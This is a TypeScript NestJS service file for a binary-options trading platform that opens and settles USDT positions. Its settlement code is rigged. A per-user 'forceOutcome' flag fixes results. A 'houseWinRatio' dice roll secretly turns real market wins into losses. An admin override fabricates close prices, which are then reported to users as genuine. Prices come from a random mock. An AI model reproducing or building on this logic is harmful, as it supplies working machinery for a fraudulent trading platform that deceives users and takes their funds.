import { Injectable, BadRequestException, Logger } from '@nestjs/common';
import { PrismaService } from '../prisma/prisma.service';
import { WalletService } from '../wallet/wallet.service';
import { BinarySide, BinaryStatus, LedgerType } from '@prisma/client';
import { Cron, CronExpression } from '@nestjs/schedule';
import { BinaryGateway } from './binary.gateway';

@Injectable()
export class BinaryService {
  private readonly logger = new Logger(BinaryService.name);

  constructor(
    private prisma: PrismaService,
    private walletService: WalletService,
    private binaryGateway: BinaryGateway,
  ) { }

  // Open a new position
  async openPosition(userId: string, pair: string, amount: number, side: BinarySide, duration: number) {
    if (amount <= 0) throw new BadRequestException('Amount must be positive');

    // Validate Duration & Get Payout Rate
    const timeframeConfig = await this.prisma.binaryTimeframe.findUnique({
      where: { seconds: duration }
    });

    if (!timeframeConfig || !timeframeConfig.isActive) {
      throw new BadRequestException('Invalid or inactive duration');
    }

    // Validate Pair
    const pairConfig = await this.prisma.binaryPair.findUnique({
      where: { symbol: pair }
    });

    if (!pairConfig || !pairConfig.isActive) {
      throw new BadRequestException('Invalid or inactive trading pair');
    }

    // 1. Lock Funds (Investment Amount)
    const currency = 'USDT';
    await this.walletService.lockFunds(userId, currency, amount);

    // 2. Get Current Price (Mock for now, real implementation needs Live Price Service)
    const entryPrice = await this.getCurrentPrice(pair);

    // 3. Create Position
    const expiresAt = new Date(Date.now() + duration * 1000);

    // Payout Logic: Use profitRatio and lossRatio
    const profitRatio = timeframeConfig.profitRatio;
    const lossRatio = timeframeConfig.lossRatio;

    // Calculate estimated payout for win
    const payout = amount * (profitRatio / 100);

    const position = await this.prisma.binaryOptionPosition.create({
      data: {
        userId,
        symbol: pair,
        amount,
        side,
        entryPrice,
        payoutRate: profitRatio / 100, // Legacy support
        profitRatio,
        lossRatio,
        targetPayout: payout,
        timeframe: duration,
        expiresAt,
        status: BinaryStatus.OPEN,
      },
    });

    // Notify User via WS
    this.binaryGateway.server.to(userId).emit('binary_position_opened', position);

    return position;
  }

  // Get Configuration for Frontend
  async getConfig() {
    const currencies = await this.prisma.currency.findMany({ where: { isActive: true } });
    const pairs = await this.prisma.binaryPair.findMany({ where: { isActive: true } });
    // Fetch from Real Data Seeding Table (OptionGameSettings)
    // Default to BTC settings (currencyId: 32, matchId: 61) as seeded
    const realSettings = await this.prisma.optionGameSettings.findMany({
      where: { currencyId: 32, matchId: 61 },
      orderBy: { duration: 'asc' }
    });

    let timeList: { seconds: number; profit: string; name: string; profit_ratio: number; loss_ratio: number }[] = [];
    if (realSettings.length > 0) {
      timeList = realSettings.map(s => ({
        seconds: s.duration,
        profit: s.payoutRate.toFixed(2),
        name: `${s.duration}s`,
        profit_ratio: Math.floor(s.payoutRate * 100), // Approx if not in DB
        loss_ratio: 0 // Default
      }));
    } else {
      // Fallback to old table
      const timeframes = await this.prisma.binaryTimeframe.findMany({ where: { isActive: true }, orderBy: { seconds: 'asc' } });
      timeList = timeframes.map(t => ({
        seconds: t.seconds,
        profit: (t.profitRatio / 100).toFixed(2),
        name: t.name,
        profit_ratio: t.profitRatio,
        loss_ratio: t.lossRatio
      }));
    }

    // Transform to match Dexixz structure approximately
    // data: [{ name: "USDT", list: [...], times: [...] }]

    const usdt = currencies.find(c => c.symbol === 'USDT');

    // Map pairs
    const pairList = pairs.map(p => ({
      match_id: p.id,
      currency_id: usdt ? usdt.id : 1, // Default to 1 if not found
      symbol: p.symbol,
      rate: p.rate,
      fee: 0,
      min_point: 1.0,
      max_point: 5000.0,
      sort: 100,
      is_show: 1,
      category: p.category, // Add this for frontend filtering
      logo: p.logo // Pass logo to frontend
    }));

    // Map times
    // timeList is already prepared above

    return {
      code: 1,
      msg: "success",
      data: [
        {
          name: "USDT",
          list: pairList,
          times: timeList
        }
      ]
    };
  }

  // Check for expired positions (Runs every second)
  @Cron(CronExpression.EVERY_SECOND)
  async checkExpiredPositions() {
    const now = new Date();

    // Find open positions that have expired
    const expiredPositions = await this.prisma.binaryOptionPosition.findMany({
      where: {
        status: BinaryStatus.OPEN,
        expiresAt: { lte: now },
      },
    });

    for (const position of expiredPositions) {
      await this.settlePosition(position);
    }
  }

  async settlePosition(position: any) {
    // Get Close Price
    const closePrice = await this.getCurrentPrice(position.symbol); // Changed from position.pair to position.symbol

    // Check User Force Outcome
    const user = await this.prisma.user.findUnique({ where: { id: position.userId } });

    // Determine Outcome
    let status: BinaryStatus = BinaryStatus.LOSS;

    if (user?.forceOutcome === 'ALWAYS_WIN' || user?.forceOutcome === 'WIN') {
      status = BinaryStatus.WIN;
    } else if (user?.forceOutcome === 'ALWAYS_LOSS' || user?.forceOutcome === 'LOSS') {
      status = BinaryStatus.LOSS;
    } else {
      // 1. Normal Market Logic
      let marketOutcome: BinaryStatus = BinaryStatus.LOSS;
      if (position.side === BinarySide.CALL) {
        if (closePrice > position.entryPrice) marketOutcome = BinaryStatus.WIN;
        else if (closePrice === position.entryPrice) marketOutcome = BinaryStatus.DRAW;
      } else { // PUT
        if (closePrice < position.entryPrice) marketOutcome = BinaryStatus.WIN;
        else if (closePrice === position.entryPrice) marketOutcome = BinaryStatus.DRAW;
      }

      // 2. Global Risk Management (House Edge)
      // Only apply risk logic if user would have won normally
      if (marketOutcome === BinaryStatus.WIN) {
        // Fetch Pair Config for Win Ratio
        const pairConfig = await this.prisma.binaryPair.findUnique({ where: { symbol: position.symbol } });
        // Default 50% House Win Ratio if not set. 
        // Logic: houseWinRatio = 60 means 60% chance the HOUSE wins (User Loses).
        const riskRatio = pairConfig?.houseWinRatio ?? 50;

        // Roll the dice (0-100)
        const roll = Math.random() * 100;

        if (roll < riskRatio) {
          // House Wins -> User Forced Loss
          status = BinaryStatus.LOSS;
          this.logger.log(`Risk Management Triggered: User ${position.userId} forced loss on ${position.symbol} (Roll: ${roll.toFixed(2)} < Ratio: ${riskRatio})`);
        } else {
          // User keeps their win
          status = BinaryStatus.WIN;
        }
      } else {
        status = marketOutcome;
      }
    }

    let profit = -position.amount; // Default Loss

    // Payout Logic
    // Uses profitRatio and lossRatio stored in the position

    let totalPayout = 0;

    if (status === BinaryStatus.WIN) {
      // WIN: Return Amount + Profit
      // Profit = Amount * (profitRatio / 100)
      profit = position.amount * (position.profitRatio / 100.0);
      totalPayout = position.amount + profit;

    } else if (status === BinaryStatus.DRAW) {
      // DRAW: Return Amount
      profit = 0;
      totalPayout = position.amount;
    } else {
      // LOSS: Check for Refund (lossRatio)
      // Refund = Amount * (lossRatio / 100)
      const refund = position.amount * (position.lossRatio / 100.0);
      totalPayout = refund;
      profit = refund - position.amount; // Negative profit
    }

    // Atomic Resolution
    await this.walletService.resolveLockedFunds(
      position.userId,
      'USDT',
      position.amount,
      totalPayout, // The amount to credit back to available balance
      LedgerType.BINARY,
      `BINARY-SETTLE-${position.id}`
    );

    // Update DB
    await this.prisma.binaryOptionPosition.update({
      where: { id: position.id },
      data: {
        status,
        closePrice,
        realizedProfit: profit
      },
    });

    // Notify User via WS
    this.binaryGateway.server.to(position.userId).emit('binary_position_closed', {
      id: position.id,
      status,
      closePrice,
      profit,
    });

    this.logger.log(`Position ${position.id} settled: ${status}`);
  }

  // Admin Override Outcome
  async adminForceResult(positionId: string, outcome: 'WIN' | 'LOSE') {
    const position = await this.prisma.binaryOptionPosition.findUnique({ where: { id: positionId } });
    if (!position || position.status !== BinaryStatus.OPEN) throw new BadRequestException('Invalid position');

    // Mock price to force outcome
    // If force WIN and CALL -> price = entry + 1
    // If force LOSE and CALL -> price = entry - 1
    let forcedPrice = position.entryPrice;
    if (outcome === 'WIN') {
      forcedPrice = position.side === BinarySide.CALL ? position.entryPrice + 100 : position.entryPrice - 100;
    } else {
      forcedPrice = position.side === BinarySide.CALL ? position.entryPrice - 100 : position.entryPrice + 100;
    }

    // We need to pass this price to settlePosition. 
    // But settlePosition fetches price internally.
    // Refactor: Allow passing price to settlePosition or creating a separate method.
    // For now, let's just duplicate logic slightly or update the implementation.

    // Hack for MVP: Update `getCurrentPrice` to check for overrides? No, that's messy.
    // Better: Create `settlePositionWithPrice`.

    await this.settlePositionWithPrice(position, forcedPrice);
    return { message: `Position forced to ${outcome}` };
  }

  async settlePositionWithPrice(position: any, closePrice: number) {
    let status: BinaryStatus = BinaryStatus.LOSS;
    let profit = -position.amount;

    if (position.side === BinarySide.CALL) {
      if (closePrice > position.entryPrice) status = BinaryStatus.WIN;
      else if (closePrice === position.entryPrice) status = BinaryStatus.DRAW;
    } else {
      if (closePrice < position.entryPrice) status = BinaryStatus.WIN;
      else if (closePrice === position.entryPrice) status = BinaryStatus.DRAW;
    }

    let totalPayout = 0;

    if (status === BinaryStatus.WIN) {
      profit = position.amount * (position.profitRatio / 100.0);
      totalPayout = position.amount + profit;
    } else if (status === BinaryStatus.DRAW) {
      profit = 0;
      totalPayout = position.amount;
    } else {
      const refund = position.amount * (position.lossRatio / 100.0);
      totalPayout = refund;
      profit = refund - position.amount;
    }

    // Atomic Resolution using resolveLockedFunds
    await this.walletService.resolveLockedFunds(
      position.userId,
      'USDT',
      position.amount,
      totalPayout,
      LedgerType.BINARY,
      `BINARY-SETTLE-FORCE-${position.id}`
    );

    await this.prisma.binaryOptionPosition.update({
      where: { id: position.id },
      data: {
        status,
        closePrice,
        realizedProfit: profit
      },
    });

    this.binaryGateway.server.to(position.userId).emit('binary_position_closed', { id: position.id, status, closePrice, profit });
  }

  // Mock Price Service
  async getCurrentPrice(pair: string): Promise<number> {
    // Random price for BTC/USDT around 40000
    return 40000 + Math.random() * 100;
  }
}
